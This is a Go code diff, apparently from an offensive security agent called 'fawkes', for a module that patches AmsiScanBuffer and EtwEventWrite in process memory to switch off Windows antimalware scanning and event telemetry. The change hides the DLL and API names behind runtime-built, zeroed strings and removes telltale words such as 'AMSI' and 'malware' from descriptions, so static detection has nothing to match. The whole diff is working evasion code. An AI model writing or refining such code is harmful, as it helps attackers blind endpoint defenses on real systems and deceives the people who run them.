@@ -8,6 +8,8 @@ import (
 	"strings"
 	"syscall"
 	"unsafe"
+
+	"fawkes/pkg/obfuscate"
 )
 
 // patchStrategy defines how a function should be patched
@@ -53,31 +55,36 @@ type knownTarget struct {
 	KnownPrologues [][]byte
 }
 
-var knownTargets = map[string]knownTarget{
-	"amsi": {
-		DLL:         "amsi.dll",
-		Function:    "AmsiScanBuffer",
-		Description: "AMSI content scanning — blocks script-based malware detection",
-		Strategy:    "xor-ret",
-		PrologueLen: 6,
-		KnownPrologues: [][]byte{
-			{0x4C, 0x8B, 0xDC},       // mov r11, rsp (Win10 20H2+)
-			{0x48, 0x89, 0x5C, 0x24}, // mov [rsp+X], rbx (Win10 1903)
-			{0x48, 0x83, 0xEC},       // sub rsp, X (generic)
+// knownTargets is built at runtime to avoid plaintext DLL/function names in the binary
+var knownTargets = buildKnownTargets()
+
+func buildKnownTargets() map[string]knownTarget {
+	return map[string]knownTarget{
+		"amsi": {
+			DLL:         obfuscate.AmsiDll(),
+			Function:    obfuscate.AmsiScanBuffer(),
+			Description: "Content scanning — blocks script-based detection",
+			Strategy:    "xor-ret",
+			PrologueLen: 6,
+			KnownPrologues: [][]byte{
+				{0x4C, 0x8B, 0xDC},       // mov r11, rsp (Win10 20H2+)
+				{0x48, 0x89, 0x5C, 0x24}, // mov [rsp+X], rbx (Win10 1903)
+				{0x48, 0x83, 0xEC},       // sub rsp, X (generic)
+			},
 		},
-	},
-	"etw": {
-		DLL:         "ntdll.dll",
-		Function:    "EtwEventWrite",
-		Description: "ETW event generation — blocks all ETW-based telemetry",
-		Strategy:    "xor-ret",
-		PrologueLen: 6,
-		KnownPrologues: [][]byte{
-			{0x4C, 0x8B, 0xDC},       // mov r11, rsp
-			{0x48, 0x89, 0x5C, 0x24}, // mov [rsp+X], rbx
-			{0x48, 0x83, 0xEC},       // sub rsp, X
+		"etw": {
+			DLL:         obfuscate.NtdllDll(),
+			Function:    obfuscate.EtwEventWrite(),
+			Description: "Event generation — blocks telemetry",
+			Strategy:    "xor-ret",
+			PrologueLen: 6,
+			KnownPrologues: [][]byte{
+				{0x4C, 0x8B, 0xDC},       // mov r11, rsp
+				{0x48, 0x89, 0x5C, 0x24}, // mov [rsp+X], rbx
+				{0x48, 0x83, 0xEC},       // sub rsp, X
+			},
 		},
-	},
+	}
 }
 
 // patchScanResult holds the result of scanning a target function
@@ -123,8 +130,12 @@ func ScanTarget(target knownTarget) patchScanResult {
 
 	// Read function prologue
 	buffer := make([]byte, target.PrologueLen)
-	k32 := syscall.MustLoadDLL("kernel32.dll")
-	readProc := k32.MustFindProc("ReadProcessMemory")
+	k32Name := obfuscate.Kernel32Dll()
+	defer obfuscate.Zero(k32Name)
+	rpmName := obfuscate.ReadProcessMemory()
+	defer obfuscate.Zero(rpmName)
+	k32 := syscall.MustLoadDLL(k32Name)
+	readProc := k32.MustFindProc(rpmName)
 	currentProcess, _ := syscall.GetCurrentProcess()
 	var bytesRead uintptr
 
@@ -221,8 +232,12 @@ func PatchTarget(target knownTarget, strategyName string) (string, error) {
 	proc, _ := dll.FindProc(target.Function)
 
 	// Change memory protection to allow writing
-	k32 := syscall.MustLoadDLL("kernel32.dll")
-	virtualProtect := k32.MustFindProc("VirtualProtect")
+	k32Name := obfuscate.Kernel32Dll()
+	defer obfuscate.Zero(k32Name)
+	vpName := obfuscate.VirtualProtect()
+	defer obfuscate.Zero(vpName)
+	k32 := syscall.MustLoadDLL(k32Name)
+	virtualProtect := k32.MustFindProc(vpName)
 	var oldProtect uint32
 
 	ret, _, err := virtualProtect.Call(
@@ -236,7 +251,9 @@ func PatchTarget(target knownTarget, strategyName string) (string, error) {
 	}
 
 	// Write patch bytes
-	writeProc := k32.MustFindProc("WriteProcessMemory")
+	wpmName := obfuscate.WriteProcessMemory()
+	defer obfuscate.Zero(wpmName)
+	writeProc := k32.MustFindProc(wpmName)
 	currentProcess, _ := syscall.GetCurrentProcess()
 	var bytesWritten uintptr
 
